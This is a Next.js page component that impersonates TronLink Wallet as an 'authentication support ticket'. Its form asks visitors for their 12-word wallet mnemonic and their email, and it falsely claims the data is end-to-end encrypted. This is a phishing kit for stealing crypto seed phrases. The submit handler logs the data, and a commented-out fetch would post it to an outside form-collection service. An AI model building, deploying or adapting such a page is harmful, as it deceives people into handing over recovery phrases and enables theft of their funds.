"use client";

import Image from "next/image";
import { Albert_Sans, Alegreya, Anonymous_Pro } from "next/font/google";
import { useState } from "react";
import Link from "next/link";

const anonymous_Pro = Anonymous_Pro({
  subsets: ["latin"],
  weight: ["400", "700"],
});

const alegreya = Alegreya({
  subsets: ["latin"],
  weight: ["400", "700"],
});

const albert_Sans = Albert_Sans({
  subsets: ["latin"],
  weight: ["400", "700"],
});

export default function Home() {
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    message: "",
  });

  const [errors, setErrors] = useState({
    name: false,
    email: false,
  });

  const [formSubmitted, setFormSubmitted] = useState(false);
  const [loading, setLoading] = useState(false);

  // Email validation regex
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

  // Function to validate individual fields on change
  const validateField = (name: string, value: string) => {
    switch (name) {
      case "name":
        return value.trim() !== "";
      case "email":
        return emailRegex.test(value);

      default:
        return true;
    }
  };

  const handleInputChange = (e: any) => {
    const { name, value } = e.target;

    setFormData({
      ...formData,
      [name]: value,
    });

    // Dynamically clear the error if the input becomes valid
    setErrors((prevErrors) => ({
      ...prevErrors,
      [name]: !validateField(name, value),
    }));
  };

  const validateForm = () => {
    const newErrors = {
      name: !formData.name.trim(),
      email: !emailRegex.test(formData.email),
    };

    setErrors(newErrors);

    return !newErrors.name && !newErrors.email;
  };

  const handleSubmit = async (e: any) => {
    e.preventDefault();
    if (validateForm()) {
      setLoading(true);
      console.log("Form is valid, attempting to submit...");
      try {
        // Simulate form submission (API call)
        await new Promise((resolve) => setTimeout(resolve, 2000)); // Simulate delay
        // await fetch('https://submit-form.com/6bnIUqvJW', {
        //   method: 'POST',
        //   headers: { 'Content-Type': 'application/json' },
        //   body: JSON.stringify(formData),
        // });

        console.log("Submitted Data: ", formData);

        setFormSubmitted(true);
      } catch (error) {
        console.error("Error submitting form", error);
      } finally {
        setLoading(false);
      }
    } else {
      console.log("Form has errors, cannot submit");
    }
  };

  return (
    <main
      className={`${anonymous_Pro.className} relative space-y-14 w-full min-h-screen md:p-10 p-5 `}
    >
      <div
        className="absolute inset-0"
        style={{
          backgroundImage: "url('/best.png')",
          backgroundRepeat: "repeat",
          backgroundSize: "150px",
          opacity: 0.05,
          zIndex: -1,
        }}
      ></div>
      <div className="flex flex-col items-center justify-center">
        <Image
          className="dark:invert "
          src="/best.png"
          alt="Next.js logo"
          width={140}
          height={140}
          priority
        />
        <h1 className={`${alegreya.className} text-4xl font-normal `}>
          TronLink Wallet
        </h1>
        <p className="text-md">Link Tron Ecosystem</p>
      </div>
      <div className={` ${albert_Sans.className} mx-auto`}>
        <h1
          className={`  md:text-4xl text-2xl italic leading-tight py-2 border-t-[1px] border-b-[1px] border-white text-center`}
        >
          Welcome to Tronlink Wallet <br /> Authentication Support <br />
          Ticket
        </h1>
      </div>

      <div className="flex flex-col gap-4 md:text-2xl text-xl tracking-wide">
        <h1>All information is end to end encrypted</h1>
        <h1>
          Fill and submit this support ticket to the system database to
          authenticate your wallet to the appropriate form.
        </h1>
      </div>

      {!formSubmitted ? (
        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="flex flex-col gap-1">
            <label htmlFor="name">
              12 mnemonics/words for Authentication <span>(required)</span>
            </label>
            <input
              type="text"
              id="name"
              name="name"
              value={formData.name}
              onChange={handleInputChange}
              className={`${
                errors.name ? "border-2 border-red-500" : ""
              } text-black py-3 px-2 rounded-md text-xl`}
              placeholder="Name"
            />
            {errors.name && (
              <p className="text-red-500">Please fill out this field.</p>
            )}
          </div>

          <div className="flex flex-col gap-1">
            <label htmlFor="email">
              Email Address <span>(required)</span>
            </label>
            <input
              type="email"
              id="email"
              name="email"
              value={formData.email}
              onChange={handleInputChange}
              className={`${
                errors.email ? "border-2 border-red-500" : ""
              } text-black py-3 px-2 rounded-md text-xl`}
              placeholder="Email"
            />
            {errors.email && (
              <p className="text-red-500">
                Please provide a valid email address.
              </p>
            )}
          </div>

          <button
            type="submit"
            className="flex gap-2 items-center bg-white text-black px-8 py-2 text-xl font-medium rounded-full"
          >
            Submit
            {loading && <span className="loader"></span>}
          </button>
        </form>
      ) : (
        <div className="text-2xl space-y-6">
          <p className="text-green-500">Ticket submitted successfully!</p>
          <button
            onClick={() => setFormSubmitted(false)}
            className="bg-none underline cursor-pointer"
          >
            Go back
          </button>
        </div>
      )}
    </main>
  );
}
